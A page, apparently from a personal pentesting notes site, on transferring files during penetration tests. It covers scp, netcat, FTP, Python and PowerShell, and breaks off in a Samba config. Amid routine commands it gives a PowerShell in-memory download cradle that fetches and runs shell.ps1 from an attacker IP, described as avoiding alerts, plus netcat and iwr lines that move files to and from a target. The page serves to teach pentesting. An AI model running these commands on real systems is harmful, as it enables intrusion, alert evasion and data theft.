
<!DOCTYPE html>

<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />

    <title>Transfering Files 101 &#8212; The InfoSec Bible</title>
    
  <link href="../../_static/css/theme.css" rel="stylesheet">
  <link href="../../_static/css/index.ff1ffe594081f20da1ef19478df9384b.css" rel="stylesheet">

    
  <link rel="stylesheet"
    href="../../_static/vendor/fontawesome/5.13.0/css/all.min.css">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="../../_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="../../_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">

    
      

    
    <link rel="stylesheet" type="text/css" href="../../_static/pygments.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-book-theme.css?digest=c3fdc42140077d1ad13ad2f1588a4309" />
    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/panels-main.c949a650a448cc0ae9fd3441c0e17fb0.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/panels-variables.06eb56fa6e07937060861dad626602ad.css" />
    
  <link rel="preload" as="script" href="../../_static/js/index.be7d3bbb2ef33a8344ce.js">

    <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
    <script src="../../_static/jquery.js"></script>
    <script src="../../_static/underscore.js"></script>
    <script src="../../_static/doctools.js"></script>
    <script src="../../_static/togglebutton.js"></script>
    <script src="../../_static/clipboard.min.js"></script>
    <script src="../../_static/copybutton.js"></script>
    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
    <script src="../../_static/sphinx-book-theme.12a9622fbb08dcb3a2a40b2c02b83a57.js"></script>
    <script async="async" src="https://unpkg.com/thebe@0.5.1/lib/index.js"></script>
    <script>
        const thebe_selector = ".thebe"
        const thebe_selector_input = "pre"
        const thebe_selector_output = ".output"
    </script>
    <script async="async" src="../../_static/sphinx-thebe.js"></script>
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="Pivotting 101" href="pivot.html" />
    <link rel="prev" title="005 Foothold" href="index.html" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="docsearch:language" content="None">
    

    <!-- Google Analytics -->
    
  </head>
  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
    
    <div class="container-fluid" id="banner"></div>

    

    <div class="container-xl">
      <div class="row">
          
<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
    
        <div class="navbar-brand-box">
    <a class="navbar-brand text-wrap" href="../../index.html">
      
        <!-- `logo` is deprecated in Sphinx 4.0, so remove this when we stop supporting 3 -->
        
      
      
      <img src="../../_static/logo.png" class="logo" alt="logo">
      
      
      <h1 class="site-logo" id="site-title">The InfoSec Bible</h1>
      
    </a>
</div><form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
  <i class="icon fas fa-search"></i>
  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
    <div class="bd-toc-item active">
        <ul class="nav bd-sidenav">
 <li class="toctree-l1">
  <a class="reference internal" href="../../intro.html">
   Welcome to the JankYard™
  </a>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  Pentesting
 </span>
</p>
<ul class="current nav bd-sidenav">
 <li class="toctree-l1 current active has-children">
  <a class="reference internal" href="../index.html">
   Penetration Testing
  </a>
  <input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/>
  <label for="toctree-checkbox-1">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul class="current">
   <li class="toctree-l2 has-children">
    <a class="reference internal" href="../groundwork/index.html">
     000 Ground Work
    </a>
    <input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
    <label for="toctree-checkbox-2">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul>
     <li class="toctree-l3">
      <a class="reference internal" href="../groundwork/notetaking.html">
       Note Taking
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../groundwork/learning.html">
       Learning Links
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../groundwork/methodology.html">
       General Methodology
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../groundwork/legal.html">
       Legal Stuff
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2 has-children">
    <a class="reference internal" href="../passiverecon/index.html">
     001 Passive Recon (OSINT)
    </a>
    <input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/>
    <label for="toctree-checkbox-3">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul>
     <li class="toctree-l3">
      <a class="reference internal" href="../passiverecon/googledorks.html">
       Google Dorks
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../passiverecon/git.html">
       GitHub/Git
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../passiverecon/shodan.html">
       Shodan.io
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2 has-children">
    <a class="reference internal" href="../activerecon/index.html">
     002 Active Recon
    </a>
    <input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/>
    <label for="toctree-checkbox-4">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul>
     <li class="toctree-l3">
      <a class="reference internal" href="../activerecon/portscanning.html">
       Port Scanning
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../activerecon/fuzzing.html">
       Fuzzing
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2 has-children">
    <a class="reference internal" href="../serviceenum/index.html">
     003 Service Enumeration
    </a>
    <input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" type="checkbox"/>
    <label for="toctree-checkbox-5">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/vulnscanning.html">
       Vulnerability Scanning
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/protocols/7_echo.html">
       Echo - Port 7
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/protocols/21_ftp.html">
       FTP - Port 21
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/protocols/22_ssh.html">
       SSH - Port 22
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/protocols/23_telnet.html">
       Telnet - Port 23
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/protocols/25_smtp.html">
       SMTP - Port 25
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/protocols/53_dns.html">
       DNS - Port 53
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/protocols/69_tftp.html">
       TFTP - Port 69
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/protocols/88_kerberos.html">
       Kerberos - Port 88
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/protocols/110_pop.html">
       POP - Port 110
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/protocols/113_ident.html">
       Ident - Port 113
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/protocols/139-445_smb.html">
       SMB - Port 139 &amp; 445
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/protocols/161_snmp.html">
       SNMP - Port 161
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../serviceenum/protocols/3128_squid.html">
       Squid - Port 3128
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2 has-children">
    <a class="reference internal" href="../webexploitation/index.html">
     004 Web Exploitation
    </a>
    <input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" type="checkbox"/>
    <label for="toctree-checkbox-6">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul>
     <li class="toctree-l3">
      <a class="reference internal" href="../webexploitation/xss.html">
       XSS - Cross Site Scripting
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../webexploitation/sqli.html">
       SQL Injection
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2 current active has-children">
    <a class="reference internal" href="index.html">
     005 Foothold
    </a>
    <input checked="" class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" type="checkbox"/>
    <label for="toctree-checkbox-7">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul class="current">
     <li class="toctree-l3 current active">
      <a class="current reference internal" href="#">
       Transfering Files 101
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="pivot.html">
       Pivotting 101
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="x_without_y.html">
       X Without Y
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2 has-children">
    <a class="reference internal" href="../privesc/index.html">
     Privilege Escalation
    </a>
    <input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" type="checkbox"/>
    <label for="toctree-checkbox-8">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul>
     <li class="toctree-l3 has-children">
      <a class="reference internal" href="../privesc/linux/index.html">
       Privilege Escalation
      </a>
      <input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" type="checkbox"/>
      <label for="toctree-checkbox-9">
       <i class="fas fa-chevron-down">
       </i>
      </label>
      <ul>
       <li class="toctree-l4">
        <a class="reference internal" href="../privesc/linux/101.html">
         Linux 101
        </a>
       </li>
       <li class="toctree-l4">
        <a class="reference internal" href="../privesc/linux/bash101.html">
         Bash Programming 101
        </a>
       </li>
       <li class="toctree-l4">
        <a class="reference internal" href="../privesc/linux/memes.html">
         Linux Memes
        </a>
       </li>
       <li class="toctree-l4">
        <a class="reference internal" href="../privesc/linux/privesc.html">
         Linux Privilege Escalation
        </a>
       </li>
      </ul>
     </li>
     <li class="toctree-l3 has-children">
      <a class="reference internal" href="../privesc/windows/index.html">
       Windows Tutorials
      </a>
      <input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" type="checkbox"/>
      <label for="toctree-checkbox-10">
       <i class="fas fa-chevron-down">
       </i>
      </label>
      <ul>
       <li class="toctree-l4">
        <a class="reference internal" href="../privesc/windows/101.html">
         Windows 101
        </a>
       </li>
       <li class="toctree-l4">
        <a class="reference internal" href="../privesc/windows/bluthund.html">
         BloodHound 101
        </a>
       </li>
       <li class="toctree-l4">
        <a class="reference internal" href="../privesc/windows/powershell101.html">
         PowerShell for Pentesters
        </a>
       </li>
      </ul>
     </li>
    </ul>
   </li>
  </ul>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  BugBounty
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../bugbounty/bugbounty.html">
   BugBounties
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" type="checkbox"/>
  <label for="toctree-checkbox-11">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../bugbounty/bugbounty_automation.html">
     Automating BugBounty
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../bugbounty/bugbounty_tips.html">
     BugBounty Tips
    </a>
   </li>
  </ul>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  Cheatsheets/Playbooks
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1">
  <a class="reference internal" href="../../notebooks.html">
   Content with notebooks
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../../testbook.html">
   Notebook Example
  </a>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  CyberDefenders.org
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../cyberdefenders/index.html">
   CyberDefenders.org
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" type="checkbox"/>
  <label for="toctree-checkbox-12">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../cyberdefenders/blueteam.html">
     BlueTeam Training
    </a>
   </li>
  </ul>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  CTFS
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../hackthebox/easy/index.html">
   HTB - Easy Boxes
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" type="checkbox"/>
  <label for="toctree-checkbox-13">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../hackthebox/easy/easybox.html">
     EASY BOX
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../hackthebox/medium/index.html">
   HTB - Medium Boxes
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" type="checkbox"/>
  <label for="toctree-checkbox-14">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../hackthebox/medium/mediumbox.html">
     MEDIUM BOX
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../hackthebox/hard/index.html">
   HTB - Hard Boxes
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-15" name="toctree-checkbox-15" type="checkbox"/>
  <label for="toctree-checkbox-15">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../hackthebox/hard/hardbox.html">
     HARD BOX
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../hackthebox/insane/index.html">
   HTB - Insane
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-16" name="toctree-checkbox-16" type="checkbox"/>
  <label for="toctree-checkbox-16">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../hackthebox/insane/insanebox.html">
     INSANE BOX
    </a>
   </li>
  </ul>
 </li>
</ul>

    </div>
</nav> <!-- To handle the deprecated key -->

<div class="navbar_extra_footer">
  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
</div>

</div>


          


          
<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
    
    <div class="topbar container-xl fixed-top">
    <div class="topbar-contents row">
        <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show"></div>
        <div class="col pl-md-4 topbar-main">
            
            <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
                data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
                aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
                title="Toggle navigation" data-toggle="tooltip" data-placement="left">
                <i class="fas fa-bars"></i>
                <i class="fas fa-arrow-left"></i>
                <i class="fas fa-arrow-up"></i>
            </button>
            
            
<div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
            class="fas fa-download"></i></button>

    <div class="dropdown-buttons">
        <!-- ipynb file if we had a myst markdown file -->
        
        <!-- Download raw file -->
        <a class="dropdown-buttons" href="../../_sources/pentesting/foothold/filetransfers.md"><button type="button"
                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                data-placement="left">.md</button></a>
        <!-- Download PDF via print -->
        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
    </div>
</div>

            <!-- Source interaction buttons -->

<div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn"
        aria-label="Connect with source repository"><i class="fab fa-github"></i></button>
    <div class="dropdown-buttons sourcebuttons">
        <a class="repository-button"
            href="https://github.com/executablebooks/jupyter-book"><button type="button" class="btn btn-secondary topbarbtn"
                data-toggle="tooltip" data-placement="left" title="Source repository"><i
                    class="fab fa-github"></i>repository</button></a>
        <a class="issues-button"
            href="https://github.com/executablebooks/jupyter-book/issues/new?title=Issue%20on%20page%20%2Fpentesting/foothold/filetransfers.html&body=Your%20issue%20content%20here."><button
                type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
        
    </div>
</div>

            <!-- Full screen (wrap in <a> to have style consistency -->

<a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
        data-placement="bottom" onclick="toggleFullScreen()" aria-label="Fullscreen mode"
        title="Fullscreen mode"><i
            class="fas fa-expand"></i></button></a>

            <!-- Launch buttons -->

        </div>

        <!-- Table of contents -->
        <div class="d-none d-md-block col-md-2 bd-toc show">
            
            <div class="tocsection onthispage pt-5 pb-3">
                <i class="fas fa-list"></i> Contents
            </div>
            <nav id="bd-toc-nav" aria-label="Page">
                <ul class="visible nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#bash-command-line-tools">
   BASH (command line tools)
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#ftp">
   FTP
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#connect">
     Connect
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#log-in">
     Log in
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#move-around">
     Move around
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#grab-files">
     Grab files
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#send-files">
     Send files
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#python">
   Python
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#with-requests">
     With Requests
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#with-wget">
     With wget
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#with-urllib">
     With urllib
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#powershell">
   Powershell
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#standard-web-request">
     Standard Web Request
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#smb">
   SMB
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#standard-smb">
     Standard SMB
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#set-folder-permissions">
     Set folder permissions
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#restart-samba">
     Restart Samba
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#monitor-logs-for-errors">
     Monitor logs for errors
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#impacket-smb">
   Impacket SMB
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#certutil">
   certutil
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#tftp">
   TFTP
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#sftp">
   SFTP
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#visualbasic">
   VisualBasic
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#webdav">
   WebDAV
  </a>
 </li>
</ul>

            </nav>
        </div>
    </div>
</div>
    <div id="main-content" class="row">
        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
        
              <div>
                
  <section class="tex2jax_ignore mathjax_ignore" id="transfering-files-101">
<h1>Transfering Files 101<a class="headerlink" href="#transfering-files-101" title="Permalink to this headline">¶</a></h1>
<p>There is more than one way to skin a cat, and there is more than one way to transfer a file.</p>
<p>Just because one method doesn’t work, doens’t mean another one won’t.</p>
<p>Try Harder™</p>
<section id="bash-command-line-tools">
<h2>BASH (command line tools)<a class="headerlink" href="#bash-command-line-tools" title="Permalink to this headline">¶</a></h2>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>wget &lt;path to file&gt; -O &lt;filename&gt;
curl &lt;path to file&gt; --output &lt;filename&gt;

<span class="c1"># Copy a file from a target to our host</span>
scp user@host:/path/to/file /path/to/destination

<span class="c1"># Copy a file from our host to a target</span>
scp /path/to/file user@host:/path/to/destination
</pre></div>
</div>
<p>We can use a netcat listener and STDOUT to write raw input to files:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># setup a listener where &quot;someFile&quot; is the file you want to write</span>
<span class="c1"># this will sit and wait for the connection, so set it up first</span>
nc -lvnp <span class="m">1337</span> &gt; someFile

<span class="c1"># On the target</span>
nc <span class="m">10</span>.10.14.4 <span class="m">1337</span> &lt; someFile
</pre></div>
</div>
<p>You’ll have no real way to tell when the transfer is done using the above <code class="docutils literal notranslate"><span class="pre">nc</span></code> method, so don’t hit Ctrl-C until you’re sure that everything copied across, and be sure to check the file size and run <code class="docutils literal notranslate"><span class="pre">file</span></code> and/or <code class="docutils literal notranslate"><span class="pre">sha256sum</span></code> to verify the integrity of the file (it can get trashed using this method)</p>
</section>
<section id="ftp">
<h2>FTP<a class="headerlink" href="#ftp" title="Permalink to this headline">¶</a></h2>
<section id="connect">
<h3>Connect<a class="headerlink" href="#connect" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ftp domain.com
ftp <span class="m">192</span>.168.0.1
ftp user@ftpdomain.com
</pre></div>
</div>
</section>
<section id="log-in">
<h3>Log in<a class="headerlink" href="#log-in" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Name: anonymous
Password:
<span class="m">230</span> Login successful.
Remote system <span class="nb">type</span> is UNIX.
Using binary mode to transfer files.
ftp&gt;
</pre></div>
</div>
</section>
<section id="move-around">
<h3>Move around<a class="headerlink" href="#move-around" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ftp&gt; ls
ftp&gt; <span class="nb">cd</span> directory
</pre></div>
</div>
</section>
<section id="grab-files">
<h3>Grab files<a class="headerlink" href="#grab-files" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>get file
</pre></div>
</div>
</section>
<section id="send-files">
<h3>Send files<a class="headerlink" href="#send-files" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>put file
</pre></div>
</div>
</section>
</section>
<section id="python">
<h2>Python<a class="headerlink" href="#python" title="Permalink to this headline">¶</a></h2>
<section id="with-requests">
<h3>With Requests<a class="headerlink" href="#with-requests" title="Permalink to this headline">¶</a></h3>
<p><code class="docutils literal notranslate"><span class="pre">pip</span> <span class="pre">install</span> <span class="pre">requests</span></code></p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://www.python.org/static/img/python-logo@2x.png&#39;</span>
<span class="n">myfile</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="nb">open</span><span class="p">(</span><span class="s1">&#39;c:/users/LikeGeeks/downloads/PythonImage.png&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">myfile</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
</pre></div>
</div>
</section>
<section id="with-wget">
<h3>With wget<a class="headerlink" href="#with-wget" title="Permalink to this headline">¶</a></h3>
<p><code class="docutils literal notranslate"><span class="pre">pip</span> <span class="pre">install</span> <span class="pre">wget</span></code></p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">wget</span>

<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;https://www.python.org/static/img/python-logo@2x.png&quot;</span>
<span class="n">wget</span><span class="o">.</span><span class="n">download</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s1">&#39;c:/users/LikeGeeks/downloads/pythonLogo.png&#39;</span><span class="p">)</span>
</pre></div>
</div>
</section>
<section id="with-urllib">
<h3>With urllib<a class="headerlink" href="#with-urllib" title="Permalink to this headline">¶</a></h3>
<p><em>should already be installed, but…</em> <code class="docutils literal notranslate"><span class="pre">pip</span> <span class="pre">install</span> <span class="pre">urllib</span></code></p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlretrieve</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">,</span> <span class="s1">&#39;path&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>With urllib3</p>
<p><code class="docutils literal notranslate"><span class="pre">pip</span> <span class="pre">install</span> <span class="pre">urllib3</span></code></p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">urllib3</span><span class="o">,</span> <span class="nn">shutil</span>

<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://www.python.org/&#39;</span>
<span class="n">c</span> <span class="o">=</span> <span class="n">urllib3</span><span class="o">.</span><span class="n">PoolManager</span><span class="p">()</span>
<span class="n">filename</span> <span class="o">=</span> <span class="s2">&quot;test.txt&quot;</span>
<span class="k">with</span> <span class="n">c</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">preload_content</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span> <span class="k">as</span> <span class="n">res</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">out_file</span><span class="p">:</span>
    <span class="n">shutil</span><span class="o">.</span><span class="n">copyfileobj</span><span class="p">(</span><span class="n">res</span><span class="p">,</span> <span class="n">out_file</span><span class="p">)</span>
</pre></div>
</div>
</section>
</section>
<section id="powershell">
<h2>Powershell<a class="headerlink" href="#powershell" title="Permalink to this headline">¶</a></h2>
<p>In-memory download cradle <em>handy for pentesting as nothing gets written to disk so there is less chance of triggering a related alert</em></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>downloadString<span class="o">(</span><span class="s1">&#39;http://10.10.14.4/shell.ps1&#39;</span><span class="o">)</span>
</pre></div>
</div>
<section id="standard-web-request">
<h3>Standard Web Request<a class="headerlink" href="#standard-web-request" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>iwr ‘http://10.10.14.4/shell.ps1’ -Outfile C:<span class="se">\W</span>indows<span class="se">\t</span>emp<span class="se">\s</span>hell.ps1

Invoke-WebRequest -Url http://10.10.14.4/shell.ps1 -Outfile C:<span class="se">\W</span>indows<span class="se">\t</span>emp<span class="se">\s</span>hell.ps1
</pre></div>
</div>
</section>
</section>
<section id="smb">
<h2>SMB<a class="headerlink" href="#smb" title="Permalink to this headline">¶</a></h2>
<section id="standard-smb">
<h3>Standard SMB<a class="headerlink" href="#standard-smb" title="Permalink to this headline">¶</a></h3>
<ol class="simple">
<li><p>Modify /etc/samba/smbd.conf. Add the following to the bottom:</p></li>
</ol>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">[</span>global<span class="o">]</span>
<span class="nv">workgroup</span> <span class="o">=</span> WORKGROUP
server <span class="nv">string</span> <span class="o">=</span> Samba Server %v
netbios <span class="nv">name</span> <span class="o">=</span> tengu
<span class="nv">security</span> <span class="o">=</span> user
